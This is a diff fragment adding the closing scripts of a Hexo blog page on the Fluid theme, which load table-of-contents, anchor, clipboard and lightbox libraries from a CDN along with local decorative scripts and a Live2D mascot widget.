+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
